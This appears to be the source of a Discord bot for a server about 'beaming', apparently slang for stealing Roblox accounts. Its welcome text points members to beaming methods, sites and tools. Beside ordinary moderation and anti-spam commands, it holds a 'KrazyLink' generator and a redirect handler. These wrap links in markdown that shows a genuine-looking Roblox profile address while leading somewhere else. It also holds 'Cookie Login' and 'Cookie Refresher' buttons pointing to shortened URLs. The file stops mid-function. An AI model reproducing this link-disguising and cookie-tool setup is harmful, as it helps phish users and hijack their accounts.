import discord
import aiohttp
import re
import datetime

from discord.ext import commands
from discord.ui import View

import os
TOKEN = os.getenv("TOKEN")

VERIFY_CHANNEL_NAME = "verification"
ROLE_NAME = "Foreign Entity"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="?", intents=intents)

# ----------------------------
# COMMAND LIST
# ----------------------------
# Sends you a full list of all commands and what they do.
# ----------------------------
@bot.command()
async def commandlist(ctx):
    await ctx.message.delete()
    try:
        msg = (
            "📜 **XØ COMMAND LIST**\n"
            "\n"
            "**SYSTEM COMMANDS**\n"
            "• ?alive — DM system status (health check)\n"
            "• ?write <channel> <message> — Bot writes a message in a channel\n"
            "\n"
            "**MODERATION COMMANDS**\n"
            "• ?kick @user <reason> — Kick a user\n"
            "• ?ban @user <reason> — Ban a user\n"
            "• ?unban <username> <reason> — Unban by username only\n"
            "• ?unbanid <user_id> <reason> — Unban using Discord ID\n"
            "• ?timeout @user <seconds> <reason> — Timeout a user\n"
            "• ?untimeout @user — Remove timeout\n"
            "• ?warn @user <reason> — DM warning to user\n"
            "• ?purge <amount> — Delete messages in channel\n"
            "• ?mute @user <reason> — Apply Muted role\n"
            "• ?unmute @user — Remove Muted role\n"
            "• ?softban @user <reason> — Ban + unban (clears messages)\n"
            "• ?slowmode <seconds> — Set slowmode\n"
            "• ?lock — Lock current channel\n"
            "• ?unlock — Unlock current channel\n"
            "• ?clear <amount> — Delete bot messages only\n"
            "\n"
            "**INFORMATION COMMANDS**\n"
            "• ?userinfo @user — DM user info\n"
            "• ?serverinfo — DM server info\n"
            "• ?banlist — DM list of banned users\n"
            "• ?modlog — DM last 20 moderation actions\n"
            "• ?case <message_id> — View a specific moderation case\n"
        )

        await ctx.author.send(msg)

        await get_log_channel().send(f"MODERATION: {ctx.author} requested command list.")

    except Exception as e:
        await ctx.author.send(f"Commandlist failed: {e}")
# ---------------- VERIFY BUTTON ----------------

class VerifyButton(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="Verify Access",
        style=discord.ButtonStyle.green,
        custom_id="verify_access_button"
    )
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        role = discord.utils.get(interaction.guild.roles, name=ROLE_NAME)
        if role is None:
            return await interaction.response.send_message("Foreign Entity role not found.", ephemeral=True)

        await interaction.user.add_roles(role)

        unverified_role = discord.utils.get(interaction.guild.roles, name="Unverified")
        if unverified_role in interaction.user.roles:
            await interaction.user.remove_roles(unverified_role)

        await interaction.response.send_message("Access Granted. Welcome to PROJECT XØ.", ephemeral=True)
# REAL REDIRECT TRACER (XwenyBot style)
async def trace_redirect(url):
    try:
        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            )
        }

        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url, allow_redirects=True) as resp:
                return str(resp.url)

    except:
        return url

class CookieRefresherButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

        self.add_item(discord.ui.Button(
            label="Cookie Refresher",
            url="https://tinyurl.com/refreshes-cookies",
            style=discord.ButtonStyle.link
        ))

# ---------------- KRAZY LINK SYSTEM ----------------

class KrazyLinkButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="Generate KrazyLink",
        style=discord.ButtonStyle.blurple,
        custom_id="krazy_link_button"
    )
    async def generate(self, interaction, button):
        await interaction.response.send_modal(KrazyLinkModal())


class KrazyLinkModal(discord.ui.Modal, title="Paste Your Roblox Link"):
    roblox_link = discord.ui.TextInput(
        label="Roblox Link",
        placeholder="https://www.roblox.com/...",
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        original_url = self.roblox_link.value

        match = re.search(r"/users/(\d+)/profile", original_url)
        user_id = match.group(1) if match else "unknown"

        visible_link = f"https:/www.roblox.com/users/{user_id}/profile"
        disguised = f"[{visible_link}]({original_url})"

        from discord import File
        import io

        file = File(io.BytesIO(disguised.encode()), filename="krazy_link.txt")

        try:
            await interaction.user.send(
                "**KRAZY LINK GENERATED**\n"
                "Copy URL below:"
            )
            await interaction.user.send(file=file)

            await interaction.response.send_message(
                "Your KrazyLink file has been sent to your DMs.",
                ephemeral=True
            )

        except discord.Forbidden:
            await interaction.response.send_message(
                "I couldn't DM you. Please enable DMs.",
                ephemeral=True
            )


# ---------------- COOKIE LOGIN BUTTON (MUST BE ABOVE on_ready) ----------------

class CookieLoginButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(
            label="Cookie Login",
            url="https://tinyurl.com/cookie-login",
            style=discord.ButtonStyle.link
        ))


# ---------------- AUTO-POST SYSTEMS ----------------

@bot.event
async def on_ready():
    print(f"XØ Firewall is online as {bot.user}")

    # ---------------- VERIFY BUTTON AUTO-POST ----------------
    for guild in bot.guilds:
        channel = discord.utils.get(guild.channels, name=VERIFY_CHANNEL_NAME)

        if channel is None:
            print(f"[{guild.name}] Verification channel not found.")
            continue

        async for message in channel.history(limit=50):
            if message.author == bot.user:
                try:
                    await message.delete()
                except:
                    pass
                break

        bot.add_view(VerifyButton())

        embed = discord.Embed(
            title="PROJECT XØ — ACCESS VERIFICATION",
            description="You are entering a protected system.\nClick below to authenticate and unlock access.",
            color=discord.Color.from_rgb(120, 0, 255)
        )

        await channel.send(embed=embed, view=VerifyButton())
        print("Verify message posted.")

    # ---------------- KRAZY LINK AUTO-POST ----------------
    try:
        krazy_channel = bot.get_channel(1549996848410923108)
        if krazy_channel is None:
            krazy_channel = await bot.fetch_channel(1549996848410923108)

        async for msg in krazy_channel.history(limit=20):
            if msg.author == bot.user and msg.components:
                for row in msg.components:
                    for component in row.children:
                        if hasattr(component, "custom_id") and component.custom_id == "krazy_link_button":
                            try:
                                await msg.delete()
                            except:
                                pass

        bot.add_view(KrazyLinkButton())
        await krazy_channel.send(view=KrazyLinkButton())
        print("KrazyLink button posted.")

    except Exception as e:
        print("Failed to post KrazyLink button:", e)

    # ---------------- COOKIE LOGIN AUTO-POST ----------------
    try:
        cookie_channel = bot.get_channel(1550957283599589447)
        if cookie_channel is None:
            cookie_channel = await bot.fetch_channel(1550957283599589447)

        async for msg in cookie_channel.history(limit=20):
            if msg.author == bot.user and msg.components:
                for row in msg.components:
                    for component in row.children:
                        if component.style == discord.ButtonStyle.link:
                            try:
                                await msg.delete()
                            except:
                                pass

        bot.add_view(CookieLoginButton())
        await cookie_channel.send(view=CookieLoginButton())
        print("CookieLogin button posted.")

    except Exception as e:
        print("Failed to post CookieLogin button:", e)

    # ---------------- COOKIE REFRESHER AUTO-POST ----------------
    try:
        refresher_thread = bot.get_channel(1551410283535270018)
        if refresher_thread is None:
            refresher_thread = await bot.fetch_channel(1551410283535270018)

        async for msg in refresher_thread.history(limit=20):
            if msg.author == bot.user and msg.components:
                for row in msg.components:
                    for component in row.children:
                        if component.style == discord.ButtonStyle.link and component.label == "Cookie Refresher":
                            try:
                                await msg.delete()
                            except:
                                pass

        bot.add_view(CookieRefresherButton())
        await refresher_thread.send(view=CookieRefresherButton())
        print("CookieRefresher button posted.")

    except Exception as e:
        print("Failed to post CookieRefresher button:", e)

    # ---------------- ALIVE STARTUP ----------------
    global alive_started

    if not alive_started:
        alive_started = True
        await alive_log("System reboot detected — restoring modules.")
        await alive_load_owner()

    await alive_start_task("heartbeat", alive_heartbeat_loop)
    await alive_start_task("status", alive_status_loop)
    await alive_start_task("daily_report", alive_daily_report_loop)

# ============================
# XØ MODERATION SYSTEM v2
# ============================

LOG_CHANNEL_ID = 1550249366902800384

def get_log_channel():
    return bot.get_channel(LOG_CHANNEL_ID)

# ----------------------------
# KICK
# ----------------------------
@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        # DM the user
        try:
            await member.send(f"You have been kicked from {ctx.guild.name}.\nReason: {reason}")
        except:
            pass

        # Kick
        await member.kick(reason=reason)

        # DM you
        await ctx.author.send(f"XØ MODERATION: {member} was kicked.\nReason: {reason}")

        # Log
        await get_log_channel().send(f"MODERATION: {member} kicked by {ctx.author}. Reason: {reason}")

    except Exception as e:
        await ctx.author.send(f"Kick failed: {e}")

# ----------------------------
# BAN
# ----------------------------
@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        try:
            await member.send(f"You have been banned from {ctx.guild.name}.\nReason: {reason}")
        except:
            pass

        await member.ban(reason=reason)

        await ctx.author.send(f"XØ MODERATION: {member} was banned.\nReason: {reason}")
        await get_log_channel().send(f"MODERATION: {member} banned by {ctx.author}. Reason: {reason}")

    except Exception as e:
        await ctx.author.send(f"Ban failed: {e}")

# ----------------------------
# UNBAN (username only, async generator safe)
# ----------------------------
@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, username: str, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        async for ban_entry in ctx.guild.bans():
            if ban_entry.user.name.lower() == username.lower():

                await ctx.guild.unban(ban_entry.user, reason=reason)

                await ctx.author.send(f"XØ MODERATION: Unbanned {username}.\nReason: {reason}")
                await get_log_channel().send(f"MODERATION: {username} unbanned by {ctx.author}. Reason: {reason}")
                return

        await ctx.author.send(f"No banned user found with username: {username}")

    except Exception as e:
        await ctx.author.send(f"Unban failed: {e}")

# ----------------------------
# TIMEOUT
# ----------------------------
@bot.command()
@commands.has_permissions(moderate_members=True)
async def timeout(ctx, member: discord.Member, seconds: int, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        until = discord.utils.utcnow() + datetime.timedelta(seconds=seconds)

        try:
            await member.send(f"You have been timed out for {seconds} seconds.\nReason: {reason}")
        except:
            pass

        await member.timeout(until, reason=reason)

        await ctx.author.send(f"XØ MODERATION: {member} timed out for {seconds} seconds.\nReason: {reason}")
        await get_log_channel().send(f"MODERATION: {member} timeout by {ctx.author}. Duration: {seconds}s. Reason: {reason}")

    except Exception as e:
        await ctx.author.send(f"Timeout failed: {e}")
# ----------------------------
# UNTIMEOUT
# ----------------------------
@bot.command()
@commands.has_permissions(moderate_members=True)
async def untimeout(ctx, member: discord.Member):
    await ctx.message.delete()
    try:
        try:
            await member.send(f"Your timeout has been removed in {ctx.guild.name}.")
        except:
            pass

        await member.timeout(None)

        await ctx.author.send(f"XØ MODERATION: Timeout removed from {member}.")
        await get_log_channel().send(f"MODERATION: Timeout removed from {member} by {ctx.author}.")

    except Exception as e:
        await ctx.author.send(f"Untimeout failed: {e}")

# ----------------------------
# WARN
# ----------------------------
@bot.command()
async def warn(ctx, member: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        await member.send(f"⚠️ WARNING from XØ Firewall:\nReason: {reason}")
        await ctx.author.send(f"Warned {member}.")
        await get_log_channel().send(f"MODERATION: {member} warned by {ctx.author}. Reason: {reason}")
    except Exception as e:
        await ctx.author.send(f"Warn failed: {e}")

# ----------------------------
# PURGE
# ----------------------------
@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    await ctx.message.delete()
    try:
        await ctx.channel.purge(limit=amount)

        await ctx.author.send(f"Purged {amount} messages in #{ctx.channel.name}.")
        await get_log_channel().send(f"MODERATION: {amount} messages purged by {ctx.author} in #{ctx.channel.name}.")

    except Exception as e:
        await ctx.author.send(f"Purge failed: {e}")

# ----------------------------
# MUTE (role-based)
# ----------------------------
@bot.command()
@commands.has_permissions(moderate_members=True)
async def mute(ctx, member: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        try:
            await member.send(f"You have been muted in {ctx.guild.name}.\nReason: {reason}")
        except:
            pass

        mute_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not mute_role:
            mute_role = await ctx.guild.create_role(name="Muted")
            for channel in ctx.guild.channels:
                await channel.set_permissions(mute_role, speak=False, send_messages=False)

        await member.add_roles(mute_role, reason=reason)

        await ctx.author.send(f"Muted {member}. Reason: {reason}")
        await get_log_channel().send(f"MODERATION: {member} muted by {ctx.author}. Reason: {reason}")

    except Exception as e:
        await ctx.author.send(f"Mute failed: {e}")

# ----------------------------
# UNMUTE
# ----------------------------
@bot.command()
@commands.has_permissions(moderate_members=True)
async def unmute(ctx, member: discord.Member):
    await ctx.message.delete()
    try:
        mute_role = discord.utils.get(ctx.guild.roles, name="Muted")

        if mute_role in member.roles:
            try:
                await member.send(f"You have been unmuted in {ctx.guild.name}.")
            except:
                pass

            await member.remove_roles(mute_role)

            await ctx.author.send(f"Unmuted {member}.")
            await get_log_channel().send(f"MODERATION: {member} unmuted by {ctx.author}.")
        else:
            await ctx.author.send("User is not muted.")

    except Exception as e:
        await ctx.author.send(f"Unmute failed: {e}")

# ----------------------------
# SOFTBAN (ban + unban)
# ----------------------------
@bot.command()
@commands.has_permissions(ban_members=True)
async def softban(ctx, member: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        try:
            await member.send(f"You have been softbanned (messages cleared) from {ctx.guild.name}.\nReason: {reason}")
        except:
            pass

        await member.ban(reason=reason)
        await ctx.guild.unban(member)

        await ctx.author.send(f"Softbanned {member}. Reason: {reason}")
        await get_log_channel().send(f"MODERATION: {member} softbanned by {ctx.author}. Reason: {reason}")

    except Exception as e:
        await ctx.author.send(f"Softban failed: {e}")

# ----------------------------
# SLOWMODE
# ----------------------------
@bot.command()
@commands.has_permissions(manage_channels=True)
async def slowmode(ctx, seconds: int):
    await ctx.message.delete()
    try:
        await ctx.channel.edit(slowmode_delay=seconds)

        await ctx.author.send(f"Slowmode set to {seconds} seconds.")
        await get_log_channel().send(f"MODERATION: Slowmode set to {seconds}s by {ctx.author}.")

    except Exception as e:
        await ctx.author.send(f"Slowmode failed: {e}")

# ----------------------------
# LOCK CHANNEL
# ----------------------------
@bot.command()
@commands.has_permissions(manage_channels=True)
async def lock(ctx):
    await ctx.message.delete()
    try:
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)

        await ctx.author.send(f"Locked #{ctx.channel.name}.")
        await get_log_channel().send(f"MODERATION: #{ctx.channel.name} locked by {ctx.author}.")

    except Exception as e:
        await ctx.author.send(f"Lock failed: {e}")

# ----------------------------
# UNLOCK CHANNEL
# ----------------------------
@bot.command()
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
    await ctx.message.delete()
    try:
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)

        await ctx.author.send(f"Unlocked #{ctx.channel.name}.")
        await get_log_channel().send(f"MODERATION: #{ctx.channel.name} unlocked by {ctx.author}.")

    except Exception as e:
        await ctx.author.send(f"Unlock failed: {e}")

# ----------------------------
# CLEAR BOT MESSAGES
# ----------------------------
@bot.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount: int):
    await ctx.message.delete()
    try:
        def is_bot(m):
            return m.author == bot.user

        deleted = await ctx.channel.purge(limit=amount, check=is_bot)

        await ctx.author.send(f"Cleared {len(deleted)} bot messages.")
        await get_log_channel().send(f"MODERATION: Cleared {len(deleted)} bot messages by {ctx.author}.")

    except Exception as e:
        await ctx.author.send(f"Clear failed: {e}")
# ----------------------------
# USERINFO
# ----------------------------
@bot.command()
async def userinfo(ctx, member: discord.Member):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title=f"User Info: {member}", color=discord.Color.blue())
        embed.add_field(name="ID", value=member.id)
        embed.add_field(name="Joined", value=member.joined_at)
        embed.add_field(name="Created", value=member.created_at)
        embed.add_field(name="Roles", value=", ".join([r.name for r in member.roles]))
        await ctx.author.send(embed=embed)
    except Exception as e:
        await ctx.author.send(f"Userinfo failed: {e}")

# ----------------------------
# SERVERINFO
# ----------------------------
@bot.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    try:
        guild = ctx.guild
        embed = discord.Embed(title=f"Server Info: {guild.name}", color=discord.Color.green())
        embed.add_field(name="Members", value=guild.member_count)
        embed.add_field(name="Created", value=guild.created_at)
        embed.add_field(name="Owner", value=guild.owner)
        await ctx.author.send(embed=embed)
    except Exception as e:
        await ctx.author.send(f"Serverinfo failed: {e}")
# ----------------------------
# BANLIST
# ----------------------------
# DMs you a list of all banned usernames.
# ----------------------------
@bot.command()
@commands.has_permissions(ban_members=True)
async def banlist(ctx):
    await ctx.message.delete()
    try:
        banned_users = []
        async for ban_entry in ctx.guild.bans():
            banned_users.append(ban_entry.user.name)

        if not banned_users:
            await ctx.author.send("No banned users found.")
            return

        msg = "Banned Users:\n" + "\n".join(f"- {u}" for u in banned_users)
        await ctx.author.send(msg)

        await get_log_channel().send(f"MODERATION: {ctx.author} requested banlist.")

    except Exception as e:
        await ctx.author.send(f"Banlist failed: {e}")

# ----------------------------
# UNBAN BY ID
# ----------------------------
# Unbans a user using their Discord ID (most reliable).
# ----------------------------
@bot.command()
@commands.has_permissions(ban_members=True)
async def unbanid(ctx, user_id: int, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user, reason=reason)

        await ctx.author.send(f"XØ MODERATION: Unbanned {user} by ID.\nReason: {reason}")
        await get_log_channel().send(f"MODERATION: {user} unbanned by {ctx.author} using ID. Reason: {reason}")

    except Exception as e:
        await ctx.author.send(f"UnbanID failed: {e}")

# ----------------------------
# MODLOG
# ----------------------------
# DMs you the last 20 moderation actions from your log channel.
# ----------------------------
@bot.command()
async def modlog(ctx):
    await ctx.message.delete()
    try:
        log_channel = get_log_channel()
        messages = await log_channel.history(limit=20).flatten()

        logs = "\n".join([f"- {m.content}" for m in messages])
        await ctx.author.send(f"Recent Moderation Actions:\n{logs}")

    except Exception as e:
        await ctx.author.send(f"Modlog failed: {e}")

# ----------------------------
# CASE LOOKUP
# ----------------------------
# Shows the details of a specific moderation action using its message ID.
# ----------------------------
@bot.command()
async def case(ctx, message_id: int):
    await ctx.message.delete()
    try:
        log_channel = get_log_channel()
        msg = await log_channel.fetch_message(message_id)

        await ctx.author.send(f"Case Details:\n{msg.content}")

    except Exception as e:
        await ctx.author.send(f"Case lookup failed: {e}")

# ----------------------------
# WELCOME MESSAGE (AGGRESSIVE)
# ----------------------------
# Sends an aggressive XØ-style welcome message when a user joins.
# ----------------------------
@bot.event
async def on_member_join(member):
    try:
        channel = discord.utils.get(member.guild.channels, name="welcome")
        if channel is None:
            return

        await channel.send(
            f"**{member.mention}, welcome to PROJECT XØ.**\n"
            f"You made it past the door — don’t get comfortable.\n"
            f"This server isn’t a playground, it’s a system.\n"
            f"If you don’t follow the rules, the system spits you out.\n\n"
            f"**VERIFY FIRST**\n"
            f"Hit the verification channel and clear the firewall.\n\n"
            f"**RULES ARE NOT OPTIONAL**\n"
            f"Break them and you're gone. No warnings.\n\n"
            f"**START HERE**\n"
            f"Go to **#how-to-start-beaming**. If you skip it, you’ll ask dumb questions and get ignored.\n\n"
            f"**METHODS & TOOLS**\n"
            f"Everything you need is inside the METHODS and TOOLS categories.\n"
            f"Use them correctly or don’t use them at all.\n\n"
            f"**SUPPORT**\n"
            f"Need help? Open a ticket. Don’t spam staff.\n\n"
            f"**COMMUNITY**\n"
            f"Keep general chat clean. No begging. No clown behavior.\n\n"
            f"**WELCOME TO XØ.**\n"
            f"**Adapt or get left behind.**"
        )

    except Exception as e:
        print(f"Welcome message failed: {e}")

# ---------------- SMART DM SYSTEM ----------------

SMART_DM_LOG_CHANNEL_ID = 1550249366902800384
SMART_DM_HEADER = (
    "XØ Protocol Response\n"
    "Your request has been processed.\n"
    "Here is the information you requested…"
)


async def send_beaming_instructions_embed(user):
    embed = discord.Embed(
        title="Beaming Instructions",
        description="Check #how-to-start-beaming",
        color=discord.Color.blue()
    )
    await user.send(SMART_DM_HEADER, embed=embed)


async def send_sites_embed(user):
    embed = discord.Embed(
        title="Sites",
        description="Check #beaming-sites",
        color=discord.Color.green()
    )
    await user.send(SMART_DM_HEADER, embed=embed)


async def send_support_help_embed(user):
    embed = discord.Embed(
        title="Support / Help",
        description="Open a ticket in #support",
        color=discord.Color.orange()
    )
    await user.send(SMART_DM_HEADER, embed=embed)


async def send_verification_info_embed(user):
    embed = discord.Embed(
        title="Verification Information",
        description="Verify in #verification",
        color=discord.Color.purple()
    )
    await user.send(SMART_DM_HEADER, embed=embed)


async def send_system_info_embed(user):
    embed = discord.Embed(
        title="System Information",
        description="If you want any help open a ticket in #support",
        color=discord.Color.red()
    )
    await user.send(SMART_DM_HEADER, embed=embed)


SMART_DM_TRIGGER_CATEGORIES = (
    (
        "Beaming Instructions",
        ("instructions", "tutorial", "beaming", "method", "beam"),
        send_beaming_instructions_embed,
    ),
    (
        "Sites",
        ("best site", "safe site", "sites", "site"),
        send_sites_embed,
    ),
    (
        "Support/Help",
        ("support", "ticket", "issue", "help"),
        send_support_help_embed,
    ),
    (
        "Verification Info",
        ("how to verify", "verification", "verify"),
        send_verification_info_embed,
    ),
    (
        "System Info",
        ("protocol", "firewall", "core", "xø"),
        send_system_info_embed,
    ),
)


def find_smart_dm_trigger(content):
    content = content.casefold()

    for category, keywords, handler in SMART_DM_TRIGGER_CATEGORIES:
        for keyword in keywords:
            if keyword in content:
                return keyword, category, handler

    return None


async def log_smart_dm_response(message, trigger, category):
    log_channel = bot.get_channel(SMART_DM_LOG_CHANNEL_ID)

    if log_channel is None:
        try:
            log_channel = await bot.fetch_channel(SMART_DM_LOG_CHANNEL_ID)
        except (discord.Forbidden, discord.HTTPException, discord.NotFound):
            return

    await log_channel.send(
        "AUTO-RESPOND\n"
        f"User: {message.author.name}\n"
        f"Trigger: {trigger}\n"
        f"Response: {category}"
    )

async def handle_redirect(message):
    original_url = message.content.strip()

    match = re.search(r"/users/(\d+)/profile", original_url)
    user_id = match.group(1) if match else "unknown"

    # REAL REDIRECT
    real_destination = await trace_redirect(original_url)

    visible_link = f"https://www.roblox.com/users/{user_id}/profile"
    disguised = f"[{visible_link}]({real_destination})"

    await message.channel.send(f"Redirect leads to: {disguised}")


@bot.event
async def on_message(message):
    print("MESSAGE EVENT FIRED:", message.content)

    if message.author.bot:
        return

    trigger_match = find_smart_dm_trigger(message.content)

    if trigger_match is not None:
        trigger, category, handler = trigger_match

        try:
            await handler(message.author)
        except (discord.Forbidden, discord.HTTPException):
            pass

        try:
            await log_smart_dm_response(message, trigger, category)
        except (discord.Forbidden, discord.HTTPException):
            pass

    await bot.process_commands(message)

    # URL detection
    if "http" in message.content:
        await handle_redirect(message)


# ---------------- SECURE FIREWALL SYSTEM ----------------

SECURE_TIMEOUT_DURATION = __import__("datetime").timedelta(seconds=10)
SECURE_LOG_CHANNEL_ID = 1550249366902800384

secure_message_timestamps = {}
secure_keyword_timestamps = {}
secure_link_timestamps = {}
secure_mention_timestamps = {}
secure_mention_warning_counts = {}


def prune_secure_timestamps(timestamps, now, window_seconds):
    timestamps[:] = [
        timestamp
        for timestamp in timestamps
        if now - timestamp <= window_seconds
    ]


def get_secure_links(content):
    links = []

    for word in content.split():
        normalized_word = word.casefold().rstrip(".,!?;:)>]}\"'")
        if normalized_word.startswith(("http://", "https://", "www.")):
            links.append(normalized_word)

    return links


async def log_secure_action(message, action_type):
    log_channel = bot.get_channel(SECURE_LOG_CHANNEL_ID)

    if log_channel is None:
        try:
            log_channel = await bot.fetch_channel(SECURE_LOG_CHANNEL_ID)
        except (discord.Forbidden, discord.HTTPException, discord.NotFound):
            return

    try:
        await log_channel.send(
            f"SECURE: {action_type} detected from {message.author.name}"
        )
    except (discord.Forbidden, discord.HTTPException):
        pass


async def send_secure_warning(user, action_type):
    try:
        await user.send(
            "SECURE Firewall Warning\n"
            f"Your activity triggered {action_type.lower()} protection. "
            "Please slow down."
        )
    except discord.DiscordException:
        pass


async def apply_secure_timeout(message, reason):
    if message.guild is None or not isinstance(message.author, discord.Member):
        return

    guild_me = message.guild.me
    if guild_me is None:
        return

    if (
        message.author == message.guild.owner
        or not guild_me.guild_permissions.moderate_members
        or message.author.top_role >= guild_me.top_role
    ):
        return

    try:
        await message.author.timeout(SECURE_TIMEOUT_DURATION, reason=reason)
    except discord.DiscordException:
        pass


async def handle_secure_anti_spam(message, now):
    user_timestamps = secure_message_timestamps.setdefault(message.author.id, [])
    prune_secure_timestamps(user_timestamps, now, 3)
    user_timestamps.append(now)

    if len(user_timestamps) >= 5:
        secure_message_timestamps.pop(message.author.id, None)
        await log_secure_action(message, "ANTI-SPAM")
        await send_secure_warning(message.author, "anti-spam")
        await apply_secure_timeout(message, "SECURE anti-spam detection")


async def handle_secure_keyword_spam(message, now):
    if find_smart_dm_trigger(message.content) is None:
        return

    user_timestamps = secure_keyword_timestamps.setdefault(message.author.id, [])
    prune_secure_timestamps(user_timestamps, now, 10)
    user_timestamps.append(now)

    if len(user_timestamps) > 3:
        secure_keyword_timestamps.pop(message.author.id, None)
        await log_secure_action(message, "ANTI-KEYWORD-SPAM")
        await send_secure_warning(message.author, "anti-keyword spam")
        await apply_secure_timeout(message, "SECURE anti-keyword spam detection")


async def handle_secure_link_flood(message, now):
    link_count = len(get_secure_links(message.content))
    if link_count == 0:
        return

    user_timestamps = secure_link_timestamps.setdefault(message.author.id, [])
    prune_secure_timestamps(user_timestamps, now, 5)
    user_timestamps.extend([now] * link_count)

    if len(user_timestamps) >= 3:
        secure_link_timestamps.pop(message.author.id, None)
        await log_secure_action(message, "ANTI-LINK-FLOOD")
        await send_secure_warning(message.author, "anti-link flood")
        await apply_secure_timeout(message, "SECURE anti-link flood detection")


async def handle_secure_mention_abuse(message, now):
    if "@everyone" not in message.content and "@here" not in message.content:
        return

    user_timestamps = secure_mention_timestamps.setdefault(message.author.id, [])
    prune_secure_timestamps(user_timestamps, now, 30)
    if not user_timestamps:
        secure_mention_warning_counts.pop(message.author.id, None)
    user_timestamps.append(now)

    if len(user_timestamps) > 1:
        warning_count = secure_mention_warning_counts.get(message.author.id, 0) + 1
        secure_mention_warning_counts[message.author.id] = warning_count

        await log_secure_action(message, "ANTI-MENTION-ABUSE")
        await send_secure_warning(message.author, "anti-mention abuse")

        # The first repeated mention only warns; a further repeat times out.
        if warning_count > 1:
            secure_mention_timestamps.pop(message.author.id, None)
            secure_mention_warning_counts.pop(message.author.id, None)
            await apply_secure_timeout(
                message,
                "SECURE repeated anti-mention abuse detection"
            )


async def run_secure_check(check, message, now):
    try:
        await check(message, now)
    except Exception as error:
        print(f"SECURE firewall check failed in {check.__name__}: {error}")


@bot.listen("on_message")
async def secure_firewall_message(message):
    if message.author.bot:
        return

    now = discord.utils.utcnow().timestamp()

    for check in (
        handle_secure_anti_spam,
        handle_secure_keyword_spam,
        handle_secure_link_flood,
        handle_secure_mention_abuse,
    ):
        await run_secure_check(check, message, now)


# ---------------- XØ ALIVE SYSTEM ----------------

ALIVE_ASYNCIO = __import__("asyncio")
ALIVE_LOG_CHANNEL_ID = 1550249366902800384
ALIVE_STATUS_MESSAGES = (
    "XØ Firewall — ACTIVE",
    "Monitoring Traffic…",
    "SMART DM Online",
    "SECURE Firewall Engaged",
    "System Pulse Stable",
)

alive_background_tasks = {}
alive_owner = None
alive_started = False
alive_counters = {
    "smart_triggers": 0,
    "secure_actions": 0,
    "broadcasts": 0,
}

alive_smart_timestamps = {}
alive_secure_message_timestamps = {}
alive_secure_keyword_timestamps = {}
alive_secure_link_timestamps = {}
alive_secure_mention_timestamps = {}
alive_secure_mention_action_counts = {}


def prune_alive_timestamps(timestamps, now, window_seconds):
    timestamps[:] = [
        timestamp
        for timestamp in timestamps
        if now - timestamp <= window_seconds
    ]


async def alive_log(content):
    log_channel = bot.get_channel(ALIVE_LOG_CHANNEL_ID)

    if log_channel is None:
        try:
            log_channel = await bot.fetch_channel(ALIVE_LOG_CHANNEL_ID)
        except discord.DiscordException:
            return

    try:
        await log_channel.send(content)
    except discord.DiscordException:
        pass


async def alive_send_dm(user, content):
    try:
        await user.send(content)
    except discord.DiscordException:
        pass


async def alive_load_owner():
    global alive_owner

    try:
        application = await bot.application_info()
        alive_owner = application.owner
    except discord.DiscordException:
        alive_owner = None


async def alive_send_daily_report(report_counters=None):
    if alive_owner is None:
        await alive_load_owner()

    if alive_owner is None:
        return

    if report_counters is None:
        report_counters = alive_counters.copy()

    report = (
        "Daily Report:\n"
        f"SMART triggers: {report_counters['smart_triggers']}\n"
        f"SECURE actions: {report_counters['secure_actions']}\n"
        f"Broadcasts: {report_counters['broadcasts']}\n"
        "System Status: Stable"
    )
    await alive_send_dm(alive_owner, report)


async def alive_heartbeat_loop():
    await bot.wait_until_ready()

    while not bot.is_closed():
        await ALIVE_ASYNCIO.sleep(3600)
        if bot.is_closed():
            return
        await alive_log("XØ Firewall — System Pulse Active")


async def alive_status_loop():
    await bot.wait_until_ready()
    status_index = 0

    while not bot.is_closed():
        try:
            await bot.change_presence(
                status=discord.Status.online,
                activity=discord.Game(name=ALIVE_STATUS_MESSAGES[status_index])
            )
        except discord.DiscordException:
            pass

        status_index = (status_index + 1) % len(ALIVE_STATUS_MESSAGES)
        await ALIVE_ASYNCIO.sleep(60)


async def alive_daily_report_loop():
    await bot.wait_until_ready()

    while not bot.is_closed():
        await ALIVE_ASYNCIO.sleep(86400)
        if bot.is_closed():
            return

        report_counters = alive_counters.copy()
        alive_counters["smart_triggers"] = 0
        alive_counters["secure_actions"] = 0
        alive_counters["broadcasts"] = 0

        await alive_send_daily_report(report_counters)


async def alive_start_task(task_name, task_function):
    task = alive_background_tasks.get(task_name)

    if task is None or task.done():
        alive_background_tasks[task_name] = bot.loop.create_task(task_function())



def alive_track_activity(message, now):
    user_id = message.author.id

    if find_smart_dm_trigger(message.content) is not None:
        alive_counters["smart_triggers"] += 1

        smart_timestamps = alive_smart_timestamps.setdefault(user_id, [])
